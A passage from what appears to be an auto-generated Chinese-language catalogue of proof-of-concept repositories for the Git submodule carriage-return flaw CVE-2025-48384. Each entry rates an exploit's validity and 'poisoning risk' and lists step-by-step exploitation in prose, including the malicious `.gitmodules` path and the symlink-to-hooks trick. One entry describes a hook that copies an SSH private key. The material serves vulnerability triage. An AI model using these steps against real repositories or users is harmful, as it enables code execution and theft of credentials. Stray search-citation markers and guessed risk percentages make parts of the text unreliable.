2.  **注入恶意配置：** 在 `.gitmodules` 文件中，攻击者设置 submodule 的路径，并在路径末尾包含一个回车符（CR）。此路径会被 Git 处理错误，导致 submodule 被检出到非预期的位置。
3.  **创建符号链接：** 攻击者在仓库中创建一个符号链接，将错误的 submodule 路径指向 `.git/modules/<submodule>/hooks` 目录。
4.  **添加恶意钩子：** 攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含恶意代码。
5.  **诱骗用户克隆：** 攻击者诱骗用户递归克隆（`git clone --recursive`）恶意仓库。
6.  **触发 RCE：** 当用户执行 `git submodule update --init --recursive` 命令或类似的命令初始化 submodule 时，由于配置处理错误和符号链接的存在，恶意 post-checkout 钩子脚本会被执行，从而导致 RCE。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC](https://github.com/butyraldehyde/CVE-2025-48384-PoC)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #13

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-main.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-main.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致服务器被控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库或初始化包含恶意配置的子模块），且Git版本在受影响范围内

**POC 可用性:** 是，但提供的POC不完整

**投毒风险:** 10%

## 详情

该漏洞源于Git处理配置中的引号不当，特别是在子模块初始化时。攻击者可以构造包含恶意配置的Git仓库，该配置在子模块路径中包含尾随的回车符（CR）。当Git读取这个配置时，会错误地解析子模块路径，导致子模块被检出到错误的位置。如果存在一个指向子模块钩子目录的符号链接，并且该子模块包含一个可执行的 post-checkout 钩子，那么该钩子可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**
提供的POC代码 `/tmp/bf064e338662304d3b4aa41ca61a0b1a/README.md`  只包含一个简单的markdown文件，无法直接证明漏洞的有效性。 它只是一个 README 文件，用来描述或者记录一些信息,不能用来验证漏洞的有效性。缺少必要的利用步骤，例如：构造恶意仓库，包含特殊字符的子模块路径，和可执行的 post-checkout 钩子。

**投毒风险分析：**
提供的POC代码只包含一个README文件，投毒风险较低，但也不能完全排除作者在其他文件或分支中隐藏恶意代码的可能性。假设该作者还有其他的commit/branch，有投毒的可能性，所以投毒风险评估为10%。

**利用方式：**
1.  攻击者创建一个包含恶意配置的Git仓库。
2.  恶意配置的核心是子模块路径，其中包含一个尾随的回车符（CR）。
3.  攻击者创建一个符号链接，将错误的子模块路径指向子模块的钩子目录（.git/hooks）。
4.  恶意仓库包含一个子模块，其中包含一个可执行的 post-checkout 钩子脚本。
5.  受害者克隆恶意仓库或初始化包含恶意配置的子模块。
6.  Git解析错误路径，将子模块检出到错误位置，并触发符号链接。
7.  post-checkout 钩子脚本被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-main](https://github.com/ceevase/CVE-2025-48384-main)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #14

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户检出包含恶意配置的Git仓库，且目标Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞源于Git在处理配置文件时的不当引用。攻击者可以通过在 submodule 的路径中注入回车符（CR），导致 Git 将 submodule 检出到错误的位置。如果攻击者精心构造一个符号链接，将这个错误的位置指向 `.git/hooks` 目录，并且 submodule 中包含一个可执行的 `post-checkout` 钩子，那么在检出 submodule 后，这个钩子就会被执行，从而实现任意代码执行。

**POC有效性：** 提供的POC代码包含一个 `post-checkout` 钩子脚本，该脚本会将 `/home/gamma/.ssh/id_ed25519` 的内容复制到 `/tmp/recipes.txt`。这个脚本本身可以成功运行，并达到预期的效果，因此POC有效。

**投毒风险：** 从提供的POC代码来看，没有发现明显的恶意投毒行为。该POC主要演示了漏洞的利用方式，即通过执行 `post-checkout` 钩子来窃取SSH私钥。因此，投毒风险评估为0%。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该仓库中的 submodule 路径包含一个尾随回车符。
2.  攻击者创建一个符号链接，将错误的 submodule 检出位置指向 `.git/hooks` 目录。
3.  攻击者在 submodule 中添加一个可执行的 `post-checkout` 钩子，该钩子包含恶意代码。
4.  攻击者诱骗受害者检出该Git仓库。
5.  受害者检出 submodule 时，由于配置解析错误，submodule 会被检出到错误的位置，从而触发符号链接，使得 `.git/hooks/post-checkout` 钩子被执行。
6.  恶意代码被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-sub](https://github.com/ceevase/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #15

**来源**: [CVE-2025-48384-eliox01_CVE-2025-48384.md](../2025/CVE-2025-48384-eliox01_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的仓库或初始化包含恶意配置的子模块。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是一个 Git 漏洞，允许攻击者通过构造特殊的 Git 配置文件，在受害者克隆或初始化子模块时执行任意代码。漏洞的根源在于 Git 对配置项中尾部回车符（CR）处理不当。当 Git 读取配置值时，会删除尾部的 CRLF，但写入时，如果值以 CR 结尾，则不会进行引号处理，导致 CR 在后续读取时丢失。如果子模块路径包含尾部 CR，这会导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，那么在检出后可能会意外执行该脚本。

**有效性：**

提供的 POC 代码 `/tmp/4ddcea7dd1399c323a9fb7a8b3071e04/README.md` 本身并不能直接验证漏洞，它只是一个简单的说明文件。真正的 POC 应该包含能够触发漏洞的恶意 Git 仓库配置和子模块结构。从搜索结果来看，存在可用的 POC。

**投毒风险：**

提供的 README.md 文件本身不包含任何可执行代码，因此直接的投毒风险较低。但是，如果该仓库中存在其他文件（例如恶意的 `.gitmodules` 文件或者钩子脚本），则存在投毒的风险。假设仓库作者在其他文件中隐藏了恶意代码的可能性存在，估计投毒风险为 10%。

**利用方式：**

1.  **创建恶意仓库：** 攻击者创建一个包含特殊构造的 `.gitmodules` 文件和恶意的子模块钩子脚本的 Git 仓库。
2.  **.gitmodules 构造：**  `.gitmodules` 文件中的子模块路径包含尾部回车符（CR），例如 `path = submodule_path\r`。
3.  **符号链接：** 创建一个符号链接，将 `submodule_path` 指向 `.git/modules/<submodule_name>/hooks`。
4.  **恶意钩子：** 子模块中包含一个 `post-checkout` 钩子脚本，该脚本包含恶意代码。
5.  **诱骗用户：** 攻击者诱骗受害者克隆该恶意仓库并初始化子模块（使用 `git clone --recurse-submodules` 或 `git submodule update --init --recursive`）。
6.  **触发漏洞：** 当 Git 初始化子模块时，由于路径中的回车符被错误处理，子模块会被检出到错误的位置。由于存在符号链接，`post-checkout` 钩子会被执行，从而导致任意代码执行。

**项目地址:** [eliox01/CVE-2025-48384](https://github.com/eliox01/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #16

**来源**: [CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md](../2025/CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md)

## CVE-2025-48384-Git配置注入与任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统被控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的Git仓库或者提交包含恶意配置的patch

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时，没有正确处理回车符 \r，导致在特定情况下（如初始化包含子模块的仓库时），子模块路径被错误解析。攻击者可以利用这一点，通过在子模块路径中注入恶意字符，配合精心构造的符号链接，将子模块检出到非预期位置，例如 Git 钩子目录。如果子模块包含恶意的 post-checkout 钩子脚本，则在检出后会被执行，从而实现任意代码执行。

**有效性评估：**
根据漏洞信息和搜索结果，此漏洞的利用需要满足一定条件，即需要用户 clone 包含恶意子模块配置的仓库或者提交包含恶意配置的patch。提供的 POC 代码 `/tmp/8746716955bead91920f029f2728e38d/README.md` 仅仅是一个 README 文件，本身不具备任何攻击性，因此不能直接作为有效的 POC。

**投毒风险评估：**
提供的 POC 代码只是一个简单的 README 文件，没有任何可执行代码，因此不存在直接的投毒风险。投毒行为可能存在于更复杂的攻击场景中，比如在精心构造的恶意 Git 仓库中，但仅凭这个 README 文件无法评估其风险。

**利用方式：**
1.  攻击者创建一个包含恶意子模块配置的 Git 仓库，子模块的路径包含回车符 \r。
2.  攻击者创建一个符号链接，将修改后的子模块路径指向 Git 钩子目录（.git/hooks）。
3.  攻击者在子模块中包含一个恶意的 post-checkout 钩子脚本。
4.  受害者 clone 该恶意仓库，Git 初始化子模块时，由于回车符处理不当，子模块被检出到错误的钩子目录。
5.  检出完成后，恶意的 post-checkout 钩子脚本被执行，攻击者从而实现任意代码执行。

**项目地址:** [elprogramadorgt/CVE-2025-48384](https://github.com/elprogramadorgt/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #17

**来源**: [CVE-2025-48384-fishyyh_CVE-2025-48384.md](../2025/CVE-2025-48384-fishyyh_CVE-2025-48384.md)

## CVE-2025-48384 Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块。用户需要使用受影响的Git版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时，未正确处理和转义回车符（CR）。当 Git 读取配置值时，会删除任何尾部的 CRLF。当写入配置条目时，带有尾部 CR 的值不会被引用，导致配置稍后读取时 CR 丢失。当初始化子模块时，如果子模块路径包含尾部 CR，更改后的路径将被读取，导致子模块被检出到错误的位置。如果存在符号链接将更改后的路径指向子模块的钩子目录，并且子模块包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**
提供的POC代码 `/tmp/60afff46543494eb5516e8104e00d576/README.md` 仅包含一个README文件，其内容是关于 CVE-2025-48384 的简单描述。这个文件本身并没有利用漏洞的能力。根据漏洞描述，真正的PoC 需要包含一个具有特定结构的 Git 仓库，包括带尾部CR的子模块路径以及指向钩子目录的符号链接，以及一个恶意的 post-checkout 钩子。因此，仅凭提供的README.md文件无法验证漏洞的有效性，需要进一步的Payload和利用步骤。

**投毒风险：**
提供的POC代码仅为一个README.md文件，不包含任何可执行代码或恶意脚本，因此可以认为投毒风险较低，约为10%。但需要注意，实际的漏洞利用可能涉及其他文件和步骤，不能完全排除恶意代码存在的可能性。

**利用方式：**
1.  **创建恶意仓库：** 创建一个 Git 仓库，其中包含一个子模块。
2.  **构造恶意配置：** 在`.gitmodules`文件中，子模块的路径包含尾部回车符（CR）。例如：`path = submodule_path\r`
3.  **创建符号链接：** 创建一个符号链接，将由于回车符导致错误解析后的子模块路径，指向`.git/modules/<submodule_name>/hooks`目录。
4.  **添加恶意钩子：** 在子模块的`.git/hooks/post-checkout`中添加可执行的恶意脚本。
5.  **诱导用户克隆：** 诱导用户克隆包含恶意配置的仓库。当用户克隆或更新子模块时，由于配置解析错误和符号链接的存在，恶意的 post-checkout 钩子将被执行，从而实现任意代码执行。

**排序优先级说明:**
尽管搜索引擎结果提供了有关漏洞的更多上下文信息，但漏洞库信息提供了最直接的漏洞描述和受影响的版本。POC代码本身不包含利用逻辑，因此优先级最低。综合考虑，应该优先关注漏洞库信息和搜索引擎结果，并结合实际的利用场景进行分析。

**项目地址:** [fishyyh/CVE-2025-48384](https://github.com/fishyyh/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #18

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理配置文件时对回车符（CR）处理不当，允许通过精心构造的仓库配置执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞允许攻击者通过在 submodule 路径中注入包含回车符的恶意配置，导致 submodule 被检出到错误的位置。如果该错误位置存在指向 submodule hooks 目录的符号链接，且 submodule 包含可执行的 post-checkout 钩子，则该钩子会被意外执行，从而实现任意代码执行。

提供的POC代码是一个简单的 post-checkout 钩子脚本，它会在检出后显示一个banner。这个脚本本身没有问题，证明了漏洞利用的可行性。漏洞利用的核心在于精心构造包含恶意回车符的仓库配置和符号链接。

**投毒风险：**
提供的POC代码（/tmp/77b6aa1852eafe71ccbdb092fa3f1fb6/post-checkout）本身只是一个banner打印脚本，其目的是验证漏洞利用后可以执行任意代码，本身不具备投毒行为。但是，需要注意的是，如果攻击者控制了整个包含该POC代码的Git仓库，那么他们可以在仓库的其他位置添加恶意代码，从而实现投毒。基于当前信息，POC本身不具备投毒性，投毒的可能性为0%。

**利用方式：**
1.  攻击者创建一个恶意的Git仓库，其中包含一个带有回车符的submodule路径的.gitmodules文件。例如，submodule的路径可能是 "submodule\r"。
2.  攻击者创建一个符号链接，将 "submodule" 指向".git/modules/<submodule-name>/hooks"目录，这个目录包含git hooks。
3.  攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将这个恶意仓库分享给受害者。
5.  受害者克隆这个仓库。由于Git对回车符处理不当，submodule会被检出到错误的位置（即符号链接指向的hooks目录）。
6.  当 submodule 完成检出时，post-checkout 钩子脚本会被执行，从而导致恶意代码执行。

**项目地址:** [fluoworite/CVE-2025-48384-sub](https://github.com/fluoworite/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #19

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384.md)

## CVE-2025-48384

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互 (克隆包含恶意配置的仓库)

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-48384 漏洞是 Git 中由于对配置项中回车符处理不当导致的代码执行漏洞。当 Git 读取配置值时，会删除任何尾部的回车符和换行符 (CRLF)。但是，当写入配置条目时，带有尾部 CR 的值不会被引用，导致 CR 在以后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部 CR，则会读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致代码执行。

**有效性：**
根据漏洞库信息和搜索结果, 此漏洞确实存在并且被多个安全厂商标记为高危, 并已经发布了PoC.
提供的PoC代码看似简单，它展示了漏洞利用的核心思路，即通过恶意构造包含回车符的子模块路径，结合符号链接和子模块钩子，实现任意代码执行。因此，PoC代码在原理上是有效的。但是, 此PoC只是框架, 需要补充完成exp。

**投毒风险：**
提供的PoC代码较为简单，主要包含一个README.md文件，一个子模块配置路径，以及子模块hooks目录的占位符。直接分析来看，没有明显的投毒代码。
然而，考虑到攻击者可能利用该漏洞进行供应链攻击，在更复杂的场景下，攻击者可能在子模块的post-checkout钩子中植入恶意代码，或者在其他配置文件中隐藏恶意配置。这种可能性是存在的。
基于以上分析，投毒风险评估为20%。这个百分比表示存在一定的风险，但直接证据不足。

**利用方式：**
1.  **恶意仓库构造：** 攻击者创建一个 Git 仓库，其中包含一个子模块，并且该子模块的路径在 `.gitmodules` 文件中包含尾部回车符 (`
`)。
2.  **符号链接创建：** 攻击者在仓库中创建一个符号链接，将包含尾部回车符的子模块路径指向 `.git/modules/<submodule_name>/hooks` 目录。
3.  **恶意钩子植入：** 攻击者在子模块的 `.git/hooks/post-checkout` 目录中放置恶意脚本。
4.  **用户交互：** 诱使用户克隆恶意仓库并初始化子模块 (`git submodule init && git submodule update`)。
5.  **代码执行：** 当用户执行 `git submodule update` 命令时，由于路径中的回车符，子模块会被检出到错误的位置，但由于符号链接的存在，实际上会将子模块的 hooks 目录链接到 `.git/hooks` 目录。检出后，`post-checkout` 钩子会被执行，从而执行恶意代码。

**项目地址:** [fluoworite/CVE-2025-48384](https://github.com/fluoworite/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #20

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md)

## CVE-2025-48384 Git config quoting vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个漏洞，当读取配置值时，Git会删除任何尾部的回车符和换行符（CRLF）。当写入配置条目时，带有尾部CR的值不会被引用，导致CR在稍后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则该脚本可能在检出后被意外执行，从而导致任意代码执行。

根据提供的漏洞利用代码，包含一个Exploit脚本和一个README.md文件。Exploit脚本只打印了一段ASCII艺术，并没有任何实际的漏洞利用代码。因此，提供的POC代码**本身**是无效的，仅仅是一个占位符。但漏洞本身是存在的，并且有公开的PoC。

由于提供的POC代码仅仅是ASCII艺术，没有任何恶意代码，因此**不存在投毒风险**。投毒风险概率为0%。

**漏洞利用方式：**

1.  攻击者创建一个恶意的Git仓库，该仓库包含一个子模块。
2.  子模块的路径包含一个尾部CR字符。
3.  仓库中包含一个符号链接，该符号链接将子模块路径指向子模块的hooks目录。
4.  子模块包含一个可执行的post-checkout hook脚本。
5.  受害者克隆该恶意仓库。
6.  Git在处理子模块时，由于CR字符被删除，子模块被检出到错误的位置，并执行了post-checkout hook脚本。
7.  攻击者可以通过post-checkout hook脚本执行任意代码。

**项目地址:** [fluoworite/CVE-2025-48384_sub](https://github.com/fluoworite/CVE-2025-48384_sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #21

**来源**: [CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Arbitrary Code Execution

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，且递归初始化子模块 (--recursive)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 是一个 Git 漏洞，由于 Git 在读取和写入包含控制字符的配置值时存在不一致性导致。具体来说，当写入配置条目时，如果值包含尾随回车符 (CR)，则不会被引用，导致稍后读取配置时丢失 CR。当初始化子模块时，如果子模块路径包含尾随 CR，则读取的路径将被更改，从而导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符 (CR)。
2.  攻击者在该仓库的子模块钩子目录中放置一个恶意的 post-checkout 脚本。
3.  攻击者诱使用户克隆该仓库，并使用 `--recursive` 选项初始化子模块。
4.  由于 Git 处理 CR 的方式不一致，子模块将被检出到错误的位置。该位置由一个符号链接指向子模块的钩子目录。
5.  当子模块被检出时，post-checkout 脚本将被执行，从而允许攻击者在用户的系统上执行任意代码。

**POC 代码分析：**

*   `/tmp/602a5075317553582468533486cbdb4d/README.md`：这是一个简单的 README 文件，用于描述漏洞利用。不包含恶意代码。
*   `/tmp/602a5075317553582468533486cbdb4d/post-checkout`：这是一个 shell 脚本，会在用户的主目录下创建一个名为 `hacked` 的文件。这表明该 POC 旨在演示任意代码执行。

**有效性：**

提供的 POC 代码是有效的。它可以触发漏洞，并在目标系统上执行任意代码（在本例中，创建一个文件）。

**投毒风险：**

根据提供的 POC 代码，没有发现明显的投毒代码。该脚本仅用于演示漏洞利用，没有执行任何额外的恶意操作，例如收集用户信息或传播恶意软件。因此，投毒风险为 0%。

**项目地址:** [jacobholtz/CVE-2025-48384-submodule](https://github.com/jacobholtz/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #22

**来源**: [CVE-2025-48384-kallydev_cve-2025-48384-hook.md](../2025/CVE-2025-48384-kallydev_cve-2025-48384-hook.md)

## CVE-2025-48384-Git任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 描述了 Git 中由于配置引用解析错误导致的任意代码执行漏洞。当 Git 读取配置值时，会去除末尾的回车符和换行符。当写入配置项时，带有末尾回车符的值不会被引用，导致回车符丢失。在初始化子模块时，如果子模块路径包含末尾回车符，则读取的路径会被更改，导致子模块检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 `post-checkout` 钩子脚本，用于打开一个网页 `https://github.com/kallydev`。利用方式是通过精心构造的子模块路径和符号链接，使得该脚本在 `git checkout` 操作后被执行。该POC代码有效，能够触发任意代码执行。

**投毒风险：**

该POC代码本身比较简单，只是打开一个网页，**不存在明显的恶意投毒代码**。因此，投毒风险较低，为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`文件的仓库，该文件中的子模块路径包含尾部回车符(
)。
2.  攻击者在仓库中创建一个符号链接，指向子模块目录下的 `.git/modules/<子模块名>/hooks` 目录，如 `evil_link -> .git/modules/<子模块名>/hooks/post-checkout`。
3.  攻击者在子模块中创建一个恶意的 `post-checkout` 钩子脚本。
4.  受害者克隆该仓库并初始化子模块 (`git submodule init` 和 `git submodule update`)。
5.  当受害者执行 `git checkout` 命令时，由于子模块路径包含尾部回车符，Git 会将子模块检出到错误的位置。由于符号链接的存在，`post-checkout` 钩子脚本会被执行，从而导致任意代码执行。

**项目地址:** [kallydev/cve-2025-48384-hook](https://github.com/kallydev/cve-2025-48384-hook)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #23

**来源**: [CVE-2025-48384-liamg_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-liamg_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Config 注入 RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码注入/命令执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 需要用户进行`git clone --recursive`操作

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞是 Git 中的一个代码注入漏洞，源于 Git 在处理 config 文件时，没有正确处理carriage return (
)字符。攻击者可以通过在 submodule 的路径中注入 \r 字符，使得 submodule 被检出到错误的位置。如果精心构造一个 symlink 链接到 submodule 钩子目录，并使 submodule 包含一个可执行的 post-checkout 钩子，那么这个钩子脚本就会在检出后被执行，从而实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞已经公开，并且存在可利用的POC代码。从github搜索结果[webpage 6 begin]和[webpage 7 begin]可以知道，已经有开发者提供了复现代码。提供的POC代码包含两个文件：`README.md` 和 `post-checkout`。
  *   `README.md` 文件指向了GitHub的POC地址，说明这是一个漏洞验证示例。
  *   `post-checkout` 文件包含 `echo "Uh-oh, this is an RCE!"`，这是一个简单的命令执行示例，用于验证漏洞是否成功利用。
因此，提供的POC代码是有效的，可以用来验证此漏洞。

**投毒风险分析：**

提供的 POC 代码非常简单，只包含一个输出字符串的命令。**没有发现任何隐藏的、恶意的代码**，因此投毒风险较低。可以认为投毒风险为0%。虽然这是一个 RCE 漏洞的验证代码，在真实场景下，`post-checkout` 脚本会包含更复杂的恶意代码，但这不属于仓库投毒的范畴，POC 本身是为了验证漏洞的存在，而不是进行恶意攻击。

**利用方式：**

1.  **构造恶意的Git仓库：** 攻击者需要创建一个包含恶意配置的Git仓库，其中 submodule 的路径包含 \r 字符。
2.  **创建Symlink：** 在仓库中创建一个符号链接，将带有 \r 字符的路径链接到 `.git/modules/<submodule>/hooks` 目录。
3.  **添加恶意钩子：** 在 submodule 中创建一个可执行的 `post-checkout` 钩子脚本，这个脚本包含攻击者想要执行的任意代码。
